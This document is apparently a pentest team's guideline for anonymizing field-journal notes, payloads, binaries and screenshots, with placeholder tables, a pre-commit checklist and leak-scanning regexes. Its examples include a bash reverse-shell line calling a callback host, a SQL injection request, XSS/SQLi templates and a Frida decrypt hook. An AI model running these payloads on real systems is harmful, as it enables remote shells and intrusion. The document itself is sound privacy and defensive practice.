# Field-Journal Anonymization Specification

> You **must anonymize** when writing field-journal entries, submitting PRs, sharing payloads, or publishing reports externally. The following placeholder specification is adapted from the anonymization protocol of the PentAGI multi-agent system. The goal is to **preserve reusable value while not exposing real targets**.

## Placeholder Master Table

### Network and Hosts

| Type | Placeholder | Applicable Scenario |
|------|-------------|---------------------|
| Target IP | `{target_ip}` | Penetration target host |
| Victim IP | `{victim_ip}` | Next hop during internal lateral movement |
| Remote host | `{remote_host}` | Generic remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback |
| Callback domain | `{callback_domain}` | OOB / reverse shell |
| Target domain | `{target_domain}` | Web / email target |
| Victim domain | `{victim_domain}` | Internal domain |
| Custom port | `{port}` | Non-standard port |
| Standard port | Keep as-is | 80 / 443 / 22 / 445 / 3389 etc. are kept for reusability |

### Credentials and Keys

| Type | Placeholder |
|------|-------------|
| Username | `{username}` |
| Password | `{password}` |
| Hash value | `{hash}` |
| Session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URLs and Endpoints

| Type | Placeholder |
|------|-------------|
| Generic URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload endpoint | `{upload_endpoint}` |
| Login endpoint | `{login_endpoint}` |

### Paths

| Type | Placeholder |
|------|-------------|
| Install directory | `{install_dir}` |
| Configuration file | `{config_path}` |
| Web root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business Identifiers

| Type | Placeholder |
|------|-------------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Phone number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order number | `{order_id}` |
| UUID | `{uuid}` |

## Things Not to Anonymize

To preserve the reusability of experience, **do not replace** the following:

- CVE numbers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306 etc.)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## Context Preservation Principle

When replacing, **preserve the semantic structure** so others can tell what it is:

```python
# ❌ Replaced entirely with X; the semantics are lost
target = "X"
url = "X/X"

# ❌ Replacement is too generic
target = "{target}"
url = "{url}"

# ✅ Context preserved
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload Anonymization

### Web payload

```
Original: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

Anonymized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Anonymized
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// Anonymized
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## Binary Sample Anonymization

### Hashes

Just record the sha256; **do not attach the original file**. If you must share the sample:

- Upload to a public sample repository such as VirusTotal or MalwareBazaar.
- Link to a same-hash sample that someone else has already analyzed.

### Strings and Symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Anonymized
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot Anonymization

- Use mosaic or solid black to cover: usernames, emails, phone numbers, order numbers, and names.
- In the URL bar, expose only the domain structure (keep the path, mask the host), or replace it entirely.
- For internal IP ranges, keep the first two octets: `10.0.x.x` instead of `10.0.10.50`.
- Image elements that identify the enterprise (logo / watermark) must be covered.

## CTF Scenario Exceptions

CTF problem statements, target hostnames, and flag formats are **usually not considered sensitive** (the target is a public challenge), but:

- Self-deployed private ranges must be treated like real environments.
- Flags must not be disclosed before the competition ends.
- Do not copy someone else's undisclosed solution directly into field-journal.

## Automated Detection Script

After writing a field-journal entry, run the following regexes to find missed anonymization:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Mainland China phone number
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

This is packaged as `skills/scripts/scan-leaks.ps1` (PowerShell, compatible with PS 5.1 / pwsh). Run it before every commit:
```powershell
powershell -File skills/scripts/scan-leaks.ps1 -Path skills/field-journal
```
CI (the `leak-scan` job in ci.yml) is already wired to this script and will fail immediately if unanonymized information is found.

## Reverse: Reading Others' Anonymized Documents

When reading someone else's field-journal / writeup, if you encounter placeholders like `{target_ip}`, **do not replace them with real values from your own environment before committing**; just leave the placeholders unchanged.

## Field-Journal Required Items

Before submitting a field-journal entry, check against this checklist:

```
□ No public IPs (except CDN / public services)
□ No real domains (except demonstration domains such as example.com)
□ No real credentials / tokens / hashes (replaced with {placeholder})
□ No names / employee IDs / emails leaked in screenshots
□ No sample files themselves (only the sha256 is kept)
□ All JWTs / OAuth codes / API keys replaced
□ Internal IP ranges blurred to the first two octets (10.0.x.x)
□ Target parameters in payloads replaced with generic placeholders
□ Cookies and session IDs replaced
```

Append this checklist directly to the end of `field-journal/_template.md`.
